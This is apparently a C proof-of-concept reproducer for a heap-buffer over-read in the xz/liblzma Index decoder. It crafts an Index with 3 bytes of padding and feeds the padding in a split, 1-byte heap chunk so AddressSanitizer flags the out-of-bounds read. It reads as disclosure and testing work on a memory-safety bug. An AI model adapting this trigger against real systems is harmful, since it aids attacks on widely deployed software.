/*
 * PoC: heap-buffer-overflow (over-read) in the .xz Index decoder's
 * Stream Padding handling when the Index is fed to lzma_code() in
 * separate chunks that split the Index Padding field.
 *
 * Build (from an xz source tree configured/built with CMake, ASan+UBSan):
 *   cc -I src/liblzma/api -o residual residual.c build/liblzma.a \
 *       -fsanitize=address,undefined
 *
 * Run:
 *   ./residual
 */

#include <lzma.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int
main(void)
{
	/* Build a small, valid lzma_index with the public API and find a
	 * single-Block Index whose Stream Padding field is 3 bytes (the
	 * maximum), which gives the largest out-of-bounds margin. */
	lzma_vli unpadded_size = 5;
	lzma_vli uncompressed_size = 1;
	lzma_index *idx = NULL;
	size_t records_header_size = 0;
	lzma_vli found_unpadded = 0, found_uncompressed = 0;
	int found = 0;

	for (unpadded_size = 5; unpadded_size < 200000 && !found;
			unpadded_size += 4) {
		for (uncompressed_size = 0; uncompressed_size < 4;
				uncompressed_size++) {
			idx = lzma_index_init(NULL);
			if (idx == NULL) {
				fprintf(stderr, "lzma_index_init failed\n");
				return 1;
			}

			if (lzma_index_append(idx, NULL, unpadded_size,
					uncompressed_size) != LZMA_OK) {
				lzma_index_end(idx, NULL);
				continue;
			}

			const size_t header_size = 1
					+ lzma_vli_size(1) /* Number of Records */
					+ lzma_vli_size(unpadded_size)
					+ lzma_vli_size(uncompressed_size);

			const lzma_vli total_size = lzma_index_size(idx);

			/* Index Padding = total - header - CRC32(4). */
			if (total_size >= header_size + 4
					&& total_size - header_size - 4 == 3) {
				records_header_size = header_size;
				found_unpadded = unpadded_size;
				found_uncompressed = uncompressed_size;
				found = 1;
				lzma_index_end(idx, NULL);
				break;
			}

			lzma_index_end(idx, NULL);
		}
	}

	if (!found) {
		fprintf(stderr, "could not find a Record size giving "
				"3 bytes of Index Padding\n");
		return 1;
	}

	/* Re-create the Index and encode it into a buffer. */
	idx = lzma_index_init(NULL);
	if (idx == NULL || lzma_index_append(idx, NULL, found_unpadded,
			found_uncompressed) != LZMA_OK) {
		fprintf(stderr, "failed to rebuild index\n");
		return 1;
	}

	const size_t buf_size = (size_t)(lzma_index_size(idx));
	uint8_t *buf = malloc(buf_size);
	if (buf == NULL) {
		fprintf(stderr, "malloc failed\n");
		return 1;
	}

	size_t out_pos = 0;
	if (lzma_index_buffer_encode(idx, buf, &out_pos, buf_size)
			!= LZMA_OK) {
		fprintf(stderr, "lzma_index_buffer_encode failed\n");
		return 1;
	}

	lzma_index_end(idx, NULL);

	/* records_header_size is the offset of the first Index Padding
	 * byte. Feed everything up to that point in the first lzma_code()
	 * call, so the decoder's state machine transitions to the Index
	 * Padding field exactly on a chunk boundary. */
	const size_t split = records_header_size;

	lzma_stream strm = LZMA_STREAM_INIT;
	lzma_index *decoded = NULL;
	if (lzma_index_decoder(&strm, &decoded, UINT64_MAX) != LZMA_OK) {
		fprintf(stderr, "lzma_index_decoder failed\n");
		return 1;
	}

	strm.next_in = buf;
	strm.avail_in = split;

	lzma_ret ret = lzma_code(&strm, LZMA_RUN);
	if (ret != LZMA_OK) {
		fprintf(stderr, "unexpected first lzma_code() result: %d\n",
				(int)ret);
		return 1;
	}

	/* Feed the Index Padding field in a tightly-sized heap buffer,
	 * one byte at a time. The real fix for the "input_size_max"
	 * off-by-input_pos issue doesn't touch this code path and the
	 * Padding loop still yields back to the caller after each byte
	 * there; on the shipped tree, the Padding loop was turned into an
	 * inner "while" loop that consumes all pending Padding bytes
	 * without rechecking how many bytes this call actually provided,
	 * reading past the end of this 1-byte allocation. */
	uint8_t *tail = malloc(1);
	if (tail == NULL) {
		fprintf(stderr, "malloc failed\n");
		return 1;
	}
	tail[0] = buf[split];

	strm.next_in = tail;
	strm.avail_in = 1;

	ret = lzma_code(&strm, LZMA_RUN);
	(void)ret;

	printf("no crash detected (unexpected on a vulnerable build)\n");

	free(tail);
	free(buf);
	lzma_end(&strm);
	return 0;
}
